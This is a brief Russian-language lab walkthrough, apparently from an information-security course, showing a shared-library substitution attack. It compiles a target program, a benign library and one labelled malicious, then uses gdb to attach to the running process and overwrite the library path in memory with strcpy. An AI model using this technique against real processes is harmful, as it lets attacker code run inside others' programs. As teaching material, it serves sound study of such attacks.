

1. Скомпилируем dll и бинарник атакуемой программы
```bash
# Исходная программа
gcc -g -ldl dll_inject.c -o dll_inject

# Первичная dll
gcc -g -fPIC -shared dll1.c -o libdll1.so

# Вредоносная dll
gcc -g -fPIC -shared dll2_python.c -o libdll2_python.so
```

2. Запускаем dll_inject
```bash
./dll_inject $(pwd)/libdll1.so
```

3. В другом терминале через gdb подключаемся к работающей программе и подменяем путь до .so
```bash
pgrep dll_inject
gdb -q
(gdb) attach 12345
(gdb) p (char*)strcpy(d, "/home/jim/Documents/MCS/semestr-4/InfSec/sys-sec/0x06/dll_replace_python/libdll2_python.so")
(gdb) detach
```
